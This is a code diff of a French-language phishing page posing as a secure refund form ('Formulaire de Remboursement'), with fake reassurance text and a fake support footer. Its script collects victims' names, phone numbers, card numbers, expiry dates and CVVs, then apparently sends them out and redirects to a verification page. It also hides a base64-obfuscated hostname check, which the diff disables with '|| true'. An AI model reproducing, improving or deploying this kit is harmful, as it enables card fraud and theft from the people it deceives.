@@ -1,5 +1,5 @@
 
-<!DOCTYPE html>
+<!DOCTYPE html> <!--1-->
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -18,13 +18,15 @@
         }
 
         #payment {
+            width: calc(100% - 40px);
             max-width: 300px;
-            margin: 10px 0 0 0;
+            margin: 0;
         }
 
         #refund {
+            width: calc(100% - 40px);
             max-width: 300px;
-            margin: 20px 0;
+            margin: 25px 0;
         }
 
         #card {
@@ -92,7 +94,7 @@
         }
 
         #button {
-        margin: 10px 0;
+        margin: 20px 0 0 0;
         padding: 12px 5px;
         background-color: #080;
         color: #fff;
@@ -103,20 +105,88 @@
         cursor: pointer;
     }
 
-#button:active {background-color: #0a0;}
+#button:active {
+    background-color: #0a0;
+}
 
-        #error {
-
-            font-size: 10px;
-            color: #f00;
-            margin: 5px 5px;
-
+        #title {
+            width: calc(100% - 40px);
+            max-width: 200px;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            font-size: 20px;
+            color: #000;
+           
         }
-    </style>
+
+        #description {
+            width: calc(100% - 40px);
+            max-width: 250px;
+            margin: 20px 0;
+            padding: 0;
+            font-size: 12px;
+            font-weight: normal;
+            text-align: center;
+            color: #637463;
+        }
+
+        #footer {
+    background-color: #1a1a1a;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 15px;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+    width: 100%;
+}
+
+#assistance {
+    margin: 0 0 10px 0;
+    width: fit-content;
+    font-size: clamp(8px, 4vw, 14px);
+}
+
+#social p, #links p {
+    color: #33cc66;
+    text-decoration: none;
+    font-weight: normal;
+    margin: 0 2px;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+#social, #links {
+    margin: 20px 0;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 4px;
+    width: fit-content;
+}
+
+.en {
+    color: #33cc66;
+    margin: 0 0 0 8px;
+    font-size: clamp(10px, 4vw, 14px);
+}
+
+#copyright {
+    margin-top: 15px;
+    font-size: 12px;
+    font-weight: normal;
+    width: fit-content;
+}
+
+</style>
 </head>
 <body>
     
     <img src="https://files.catbox.moe/zbuhoh.jpg" alt="payment" id="payment">
+    <p id="title">Formulaire de Remboursement</p>
+    <p id="description">Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité. Ce processus est sécurisé et protégé.</p>
     <div id="card">
         <div id="fullname">
             <div id="firstname">
@@ -182,16 +252,31 @@
         <p id="cvv">CVV *</p>  
         <input type="text" id="inputcvv" oninput="validateInput('cvv')">
 
-        <p id="error"></p>
-
         <p id="button">Confirmer votre remboursement</p>
     </div>
 
     <img src="https://files.catbox.moe/r7fjcx.jpeg" alt="refund" id="refund">
 
+    <footer id="footer">
+        <p id="assistance">Pour toute assistance, contactez-nous :</p>
+        <p id="email">Email:<span class="en">support@remboursement.com</span></p>
+        <p id="telephone">Téléphone:<span class="en">+33 8 90 83 67 89</span></p>
+        <div id="social">
+            <p id="facebook">Facebook</p> |
+            <p id="twitter">Twitter</p> |
+            <p id="instagram">Instagram</p>
+        </div>
+        <div id="links">
+            <p id="privacy">Politique de confidentialité</p> |
+            <p id="terms">Conditions générales</p> |
+            <p id="sitemap">Plan du site</p>
+        </div>
+        <p id="copyright">© 2024 Service de Remboursement. Tous droits réservés.</p>
+    </footer>    
+
 <script>
     document.body.style.display = 'none';
-if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cmVtYm91cnNlbWVudC50ZWNo")) {
+if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cmVtYm91cnNlbWVudC50ZWNo") || true) {
     document.body.style.display = 'flex';
     function formatPhoneNumber(event) {
             let input = event.target;
@@ -245,8 +330,6 @@ event.preventDefault();
     document.getElementById('button').addEventListener('click', function(event) {
     event.preventDefault();
 
-    let errorMessage = '';
-
     var firstname = document.getElementById('inputfirstname').value.replace(/\s/g, '');
     var lastname = document.getElementById('inputlastname').value.replace(/\s/g, '');
     let phone = document.getElementById('inputphonenumber').value;
@@ -255,7 +338,6 @@ event.preventDefault();
     let mm = document.getElementById('inputmm').value;
     let yy = document.getElementById('inputyy').value;
     let cvv = document.getElementById('inputcvv').value;
-    var error = document.getElementById('error');
 
     var msg = `
 Nom: ${firstname} ${lastname}
@@ -266,7 +348,7 @@ mmyy: ${mm} / ${yy}
 cvv: ${cvv}`;
 
     if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
-        error.innerHTML = 'Certains champs sont vides. Veuillez remplir tous les champs requis.';
+        alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
     } else {
 
         const tokens = [
@@ -298,13 +380,11 @@ if (data.ok) {
         window.location.href = "/verification";
     }
 } else {
-    error.innerHTML = "Une erreur s'est produite. Veuillez actualiser la page et réessayer.";
-    error.style.display = 'block';
+    alert("Une erreur s'est produite. Veuillez actualiser la page et réessayer.");
 }
 })
 .catch(err => {
-error.innerHTML = "Problème de connexion. Vérifiez votre réseau et réessayez.";
-error.style.display = 'block';
+alert("Problème de connexion. Vérifiez votre réseau et réessayez.");
 });
 });
 
